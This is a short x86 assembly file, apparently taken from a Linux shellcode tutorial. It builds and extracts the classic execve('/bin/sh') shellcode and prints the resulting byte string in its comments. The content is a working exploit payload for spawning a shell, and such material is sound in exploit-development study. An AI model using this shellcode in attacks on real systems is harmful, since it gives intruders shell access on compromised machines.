; Code taken from https://axcheron.github.io/linux-shellcode-101-from-hell-to-shell/, all credit goes to Alexandre CHERON, the code was written December 30th 2019
; nasm -f elf32 shellcode_generator.asm
; ld -m elf_i386 shellcode_generator.o -o shellcode_generator
; To get the shellcode: objdump -d ./shellcode_generator|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g
; Output should be: "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
BITS 32

section .text
global _start

_start:
xor eax, eax
push eax        ; string terminator
push 0x68732f6e ; "hs/n"
push 0x69622f2f ; "ib//"
mov ebx, esp    ; "//bin/sh",0 pointer is ESP
xor ecx, ecx    ; ECX = 0
xor edx, edx    ; EDX = 0
mov al, 0xb     ; execve()
int 0x80 